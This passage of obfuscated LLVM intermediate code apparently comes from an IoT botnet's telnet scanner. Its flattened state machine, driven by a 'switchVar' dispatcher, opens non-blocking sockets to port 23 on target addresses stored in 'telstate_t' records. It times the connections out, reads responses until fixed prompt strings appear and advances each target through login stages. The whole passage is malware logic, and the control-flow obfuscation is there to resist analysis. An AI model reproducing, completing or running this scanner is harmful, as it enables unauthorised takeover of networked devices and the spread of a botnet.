  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload388, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 3
  store i8 1, i8* %164, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  store i32 850998052, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %167, align 4
  %168 = call zeroext i16 @htons(i16 zeroext 23) #13
  %169 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %168, i16* %169, align 2
  %170 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %171 = getelementptr inbounds [8 x i8], [8 x i8]* %170, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %171, i8 0, i64 8, i32 4, i1 false)
  %172 = load i32, i32* %2, align 4
  %173 = sext i32 %172 to i64
  %.reload387 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload387, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 1
  %176 = load i32, i32* %175, align 4
  %177 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %178 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %177, i32 0, i32 0
  store i32 %176, i32* %178, align 4
  %179 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %180 = load i32, i32* %2, align 4
  %181 = sext i32 %180 to i64
  %.reload386 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload386, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 0
  store i32 %179, i32* %183, align 16
  %184 = load i32, i32* %2, align 4
  %185 = sext i32 %184 to i64
  %.reload385 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload385, i64 %185
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 16
  %189 = bitcast %struct.timeval* %10 to i8*
  %190 = call i32 @setsockopt(i32 %188, i32 1, i32 20, i8* %189, i32 16) #2
  %191 = load i32, i32* %2, align 4
  %192 = sext i32 %191 to i64
  %.reload384 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload384, i64 %192
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %193, i32 0, i32 0
  %195 = load i32, i32* %194, align 16
  %196 = bitcast %struct.timeval* %10 to i8*
  %197 = call i32 @setsockopt(i32 %195, i32 1, i32 21, i8* %196, i32 16) #2
  %198 = load i32, i32* %2, align 4
  %199 = sext i32 %198 to i64
  %.reload383 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload383, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 0
  %202 = load i32, i32* %201, align 16
  %203 = icmp eq i32 %202, -1
  %204 = select i1 %203, i32 155573021, i32 -1268457325
  store i32 %204, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load i32, i32* %2, align 4
  %208 = sext i32 %207 to i64
  %.reload382 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload382, i64 %208
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 16
  %212 = load i32, i32* %2, align 4
  %213 = sext i32 %212 to i64
  %.reload381 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload381, i64 %213
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 16
  %217 = call i32 (i32, i32, ...) @fcntl(i32 %216, i32 3, i8* null)
  %218 = or i32 %217, 2048
  %219 = call i32 (i32, i32, ...) @fcntl(i32 %211, i32 4, i32 %218)
  %220 = load i32, i32* %2, align 4
  %221 = sext i32 %220 to i64
  %.reload380 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload380, i64 %221
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 16
  %225 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %226 = call i32 @connect(i32 %224, %struct.sockaddr* %225, i32 16)
  %227 = icmp eq i32 %226, -1
  %228 = select i1 %227, i32 1443103259, i32 -2026666440
  store i32 %228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = call i32* @__errno_location() #13
  %231 = load i32, i32* %230, align 4
  %232 = icmp ne i32 %231, 115
  %233 = select i1 %232, i32 1840295065, i32 -2026666440
  store i32 %233, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i32, i32* %2, align 4
  %236 = sext i32 %235 to i64
  %.reload379 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload379, i64 %236
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %237, i32 0, i32 0
  %239 = load i32, i32* %238, align 16
  %240 = call i32 @sclose(i32 %239)
  %241 = load i32, i32* %2, align 4
  %242 = sext i32 %241 to i64
  %.reload378 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload378, i64 %242
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %243, i32 0, i32 3
  store i8 1, i8* %244, align 1
  store i32 -1607699657, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  %246 = load i32, i32* %2, align 4
  %247 = sext i32 %246 to i64
  %.reload377 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload377, i64 %247
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %248, i32 0, i32 2
  store i8 1, i8* %249, align 8
  %250 = load i32, i32* %2, align 4
  %251 = sext i32 %250 to i64
  %.reload376 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload376, i64 %251
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %252, i32 0, i32 6
  store i32 0, i32* %253, align 4
  store i32 -1607699657, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i32, i32* %2, align 4
  %257 = sext i32 %256 to i64
  %.reload375 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload375, i64 %257
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %258, i32 0, i32 6
  %260 = load i32, i32* %259, align 4
  %261 = icmp eq i32 %260, 0
  %262 = select i1 %261, i32 -1532465167, i32 -833015210
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = call i64 @time(i64* null) #2
  %265 = trunc i64 %264 to i32
  %266 = load i32, i32* %2, align 4
  %267 = sext i32 %266 to i64
  %.reload374 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload374, i64 %267
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %268, i32 0, i32 6
  store i32 %265, i32* %269, align 4
  store i32 -833015210, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  store i32 -176663025, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %273 = getelementptr inbounds [16 x i64], [16 x i64]* %272, i64 0, i64 0
  %274 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %273) #2, !srcloc !5
  %275 = extractvalue { i64, i64* } %274, 0
  %276 = extractvalue { i64, i64* } %274, 1
  %277 = trunc i64 %275 to i32
  store i32 %277, i32* %12, align 4
  %278 = ptrtoint i64* %276 to i64
  %279 = trunc i64 %278 to i32
  store i32 %279, i32* %13, align 4
  store i32 -1096563910, i32* %switchVar
  br label %loopEnd

; <label>:280:                                    ; preds = %loopEntry
  store i32 793935853, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load i32, i32* %2, align 4
  %283 = sext i32 %282 to i64
  %.reload373 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload373, i64 %283
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 16
  %287 = srem i32 %286, 64
  %288 = zext i32 %287 to i64
  %289 = shl i64 1, %288
  %290 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %291 = load i32, i32* %2, align 4
  %292 = sext i32 %291 to i64
  %.reload372 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload372, i64 %292
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %293, i32 0, i32 0
  %295 = load i32, i32* %294, align 16
  %296 = sdiv i32 %295, 64
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds [16 x i64], [16 x i64]* %290, i64 0, i64 %297
  %299 = load i64, i64* %298, align 8
  %300 = or i64 %299, %289
  store i64 %300, i64* %298, align 8
  %301 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %301, align 8
  %302 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %302, align 8
  %303 = load i32, i32* %2, align 4
  %304 = sext i32 %303 to i64
  %.reload371 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload371, i64 %304
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 16
  %308 = add nsw i32 %307, 1
  %309 = call i32 @select(i32 %308, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %309, i32* %3, align 4
  %310 = load i32, i32* %3, align 4
  %311 = icmp eq i32 %310, 1
  %312 = select i1 %311, i32 -1404957478, i32 -302314883
  store i32 %312, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %314 = load i32, i32* %2, align 4
  %315 = sext i32 %314 to i64
  %.reload370 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload370, i64 %315
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %316, i32 0, i32 0
  %318 = load i32, i32* %317, align 16
  %319 = bitcast i32* %7 to i8*
  %320 = call i32 @getsockopt(i32 %318, i32 1, i32 4, i8* %319, i32* %6) #2
  %321 = load i32, i32* %7, align 4
  %322 = icmp ne i32 %321, 0
  %323 = select i1 %322, i32 -1688531010, i32 -1976305536
  store i32 %323, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  %325 = load i32, i32* %2, align 4
  %326 = sext i32 %325 to i64
  %.reload369 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload369, i64 %326
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %327, i32 0, i32 0
  %329 = load i32, i32* %328, align 16
  %330 = call i32 @sclose(i32 %329)
  %331 = load i32, i32* %2, align 4
  %332 = sext i32 %331 to i64
  %.reload368 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload368, i64 %332
  %334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %333, i32 0, i32 2
  store i8 0, i8* %334, align 8
  %335 = load i32, i32* %2, align 4
  %336 = sext i32 %335 to i64
  %.reload367 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload367, i64 %336
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %337, i32 0, i32 3
  store i8 1, i8* %338, align 1
  store i32 116729086, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load i32, i32* %2, align 4
  %341 = sext i32 %340 to i64
  %.reload366 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload366, i64 %341
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %342, i32 0, i32 0
  %344 = load i32, i32* %343, align 16
  %345 = load i32, i32* %2, align 4
  %346 = sext i32 %345 to i64
  %.reload365 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload365, i64 %346
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %347, i32 0, i32 0
  %349 = load i32, i32* %348, align 16
  %350 = call i32 (i32, i32, ...) @fcntl(i32 %349, i32 3, i8* null)
  %351 = and i32 %350, -2049
  %352 = call i32 (i32, i32, ...) @fcntl(i32 %344, i32 4, i32 %351)
  %353 = load i32, i32* %2, align 4
  %354 = sext i32 %353 to i64
  %.reload364 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload364, i64 %354
  %356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %355, i32 0, i32 6
  store i32 0, i32* %356, align 4
  %357 = load i32, i32* %2, align 4
  %358 = sext i32 %357 to i64
  %.reload363 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload363, i64 %358
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %359, i32 0, i32 7
  store i16 0, i16* %360, align 16
  %361 = load i32, i32* %2, align 4
  %362 = sext i32 %361 to i64
  %.reload362 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload362, i64 %362
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %363, i32 0, i32 8
  %365 = load i8*, i8** %364, align 8
  call void @llvm.memset.p0i8.i64(i8* %365, i8 0, i64 1024, i32 1, i1 false)
  %366 = load i32, i32* %2, align 4
  %367 = sext i32 %366 to i64
  %.reload361 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload361, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 2
  store i8 2, i8* %369, align 8
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:370:                                    ; preds = %loopEntry
  store i32 697978820, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i32, i32* %3, align 4
  %373 = icmp eq i32 %372, -1
  %374 = select i1 %373, i32 1326883952, i32 -998772303
  store i32 %374, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  %376 = load i32, i32* %2, align 4
  %377 = sext i32 %376 to i64
  %.reload360 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload360, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 0
  %380 = load i32, i32* %379, align 16
  %381 = call i32 @sclose(i32 %380)
  %382 = load i32, i32* %2, align 4
  %383 = sext i32 %382 to i64
  %.reload359 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload359, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %384, i32 0, i32 2
  store i8 0, i8* %385, align 8
  %386 = load i32, i32* %2, align 4
  %387 = sext i32 %386 to i64
  %.reload358 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload358, i64 %387
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %388, i32 0, i32 3
  store i8 1, i8* %389, align 1
  store i32 -998772303, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  store i32 697978820, i32* %switchVar
  br label %loopEnd

; <label>:391:                                    ; preds = %loopEntry
  %392 = load i32, i32* %2, align 4
  %393 = sext i32 %392 to i64
  %.reload357 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload357, i64 %393
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %394, i32 0, i32 6
  %396 = load i32, i32* %395, align 4
  %397 = add i32 %396, 10
  %398 = zext i32 %397 to i64
  %399 = call i64 @time(i64* null) #2
  %400 = icmp slt i64 %398, %399
  %401 = select i1 %400, i32 -1773859900, i32 1290858659
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = load i32, i32* %2, align 4
  %404 = sext i32 %403 to i64
  %.reload356 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload356, i64 %404
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %405, i32 0, i32 0
  %407 = load i32, i32* %406, align 16
  %408 = call i32 @sclose(i32 %407)
  %409 = load i32, i32* %2, align 4
  %410 = sext i32 %409 to i64
  %.reload355 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload355, i64 %410
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %411, i32 0, i32 2
  store i8 0, i8* %412, align 8
  %413 = load i32, i32* %2, align 4
  %414 = sext i32 %413 to i64
  %.reload354 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload354, i64 %414
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %415, i32 0, i32 3
  store i8 1, i8* %416, align 1
  store i32 1290858659, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

; <label>:418:                                    ; preds = %loopEntry
  %419 = load i32, i32* %2, align 4
  %420 = sext i32 %419 to i64
  %.reload353 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload353, i64 %420
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %421, i32 0, i32 6
  %423 = load i32, i32* %422, align 4
  %424 = icmp eq i32 %423, 0
  %425 = select i1 %424, i32 -2052224924, i32 -846079691
  store i32 %425, i32* %switchVar
  br label %loopEnd

; <label>:426:                                    ; preds = %loopEntry
  %427 = call i64 @time(i64* null) #2
  %428 = trunc i64 %427 to i32
  %429 = load i32, i32* %2, align 4
  %430 = sext i32 %429 to i64
  %.reload352 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload352, i64 %430
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %431, i32 0, i32 6
  store i32 %428, i32* %432, align 4
  store i32 -846079691, i32* %switchVar
  br label %loopEnd

; <label>:433:                                    ; preds = %loopEntry
  %434 = load i32, i32* %2, align 4
  %435 = sext i32 %434 to i64
  %.reload351 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload351, i64 %435
  %437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %436, i32 0, i32 0
  %438 = load i32, i32* %437, align 16
  %439 = load i32, i32* %2, align 4
  %440 = sext i32 %439 to i64
  %.reload350 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %441 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload350, i64 %440
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %441, i32 0, i32 8
  %443 = load i8*, i8** %442, align 8
  %444 = load i32, i32* %2, align 4
  %445 = sext i32 %444 to i64
  %.reload349 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload349, i64 %445
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %446, i32 0, i32 7
  %448 = load i16, i16* %447, align 16
  %449 = zext i16 %448 to i32
  %450 = call i32 @readUntil(i32 %438, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %443, i32 1024, i32 %449)
  %451 = icmp ne i32 %450, 0
  %452 = select i1 %451, i32 -471767697, i32 2022870444
  store i32 %452, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  %454 = load i32, i32* %2, align 4
  %455 = sext i32 %454 to i64
  %.reload348 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload348, i64 %455
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %456, i32 0, i32 6
  store i32 0, i32* %457, align 4
  %458 = load i32, i32* %2, align 4
  %459 = sext i32 %458 to i64
  %.reload347 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload347, i64 %459
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %460, i32 0, i32 7
  store i16 0, i16* %461, align 16
  %462 = load i32, i32* %2, align 4
  %463 = sext i32 %462 to i64
  %.reload346 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload346, i64 %463
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %464, i32 0, i32 8
  %466 = load i8*, i8** %465, align 8
  %467 = call i8* @strstr(i8* %466, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %468 = icmp ne i8* %467, null
  %469 = select i1 %468, i32 -1527319014, i32 -1398479696
  store i32 %469, i32* %switchVar
  br label %loopEnd

; <label>:470:                                    ; preds = %loopEntry
  %471 = load i32, i32* %2, align 4
  %472 = sext i32 %471 to i64
  %.reload345 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload345, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 2
  store i8 5, i8* %474, align 8
  store i32 247331024, i32* %switchVar
  br label %loopEnd

; <label>:475:                                    ; preds = %loopEntry
  %476 = load i32, i32* %2, align 4
  %477 = sext i32 %476 to i64
  %.reload344 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload344, i64 %477
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %478, i32 0, i32 8
  %480 = load i8*, i8** %479, align 8
  call void @llvm.memset.p0i8.i64(i8* %480, i8 0, i64 1024, i32 1, i1 false)
  store i32 247331024, i32* %switchVar
  br label %loopEnd

; <label>:481:                                    ; preds = %loopEntry
  %482 = load i32, i32* %2, align 4
  %483 = sext i32 %482 to i64
  %.reload343 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload343, i64 %483
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %484, i32 0, i32 2
  store i8 3, i8* %485, align 8
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  %487 = load i32, i32* %2, align 4
  %488 = sext i32 %487 to i64
  %.reload342 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload342, i64 %488
  %490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %489, i32 0, i32 0
  %491 = load i32, i32* %490, align 16
  %492 = load i32, i32* %2, align 4
  %493 = sext i32 %492 to i64
  %.reload341 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload341, i64 %493
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %494, i32 0, i32 8
  %496 = load i8*, i8** %495, align 8
  %497 = load i32, i32* %2, align 4
  %498 = sext i32 %497 to i64
  %.reload340 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload340, i64 %498
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %499, i32 0, i32 7
  %501 = load i16, i16* %500, align 16
  %502 = zext i16 %501 to i32
  %503 = call i32 @readUntil(i32 %491, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %496, i32 1024, i32 %502)
  %504 = icmp ne i32 %503, 0
  %505 = select i1 %504, i32 399446786, i32 -1842583322
  store i32 %505, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  %507 = load i32, i32* %2, align 4
  %508 = sext i32 %507 to i64
  %.reload339 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload339, i64 %508
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %509, i32 0, i32 6
  store i32 0, i32* %510, align 4
  %511 = load i32, i32* %2, align 4
  %512 = sext i32 %511 to i64
  %.reload338 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload338, i64 %512
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %513, i32 0, i32 7
  store i16 0, i16* %514, align 16
  %515 = load i32, i32* %2, align 4
  %516 = sext i32 %515 to i64
  %.reload337 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload337, i64 %516
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %517, i32 0, i32 8
  %519 = load i8*, i8** %518, align 8
  %520 = call i8* @strstr(i8* %519, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %521 = icmp ne i8* %520, null
  %522 = select i1 %521, i32 795019095, i32 -1887703515
  store i32 %522, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  %524 = load i32, i32* %2, align 4
  %525 = sext i32 %524 to i64
  %.reload336 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload336, i64 %525
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %526, i32 0, i32 2
  store i8 5, i8* %527, align 8
  store i32 1842975591, i32* %switchVar
  br label %loopEnd

; <label>:528:                                    ; preds = %loopEntry
  %529 = load i32, i32* %2, align 4
  %530 = sext i32 %529 to i64
  %.reload335 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload335, i64 %530
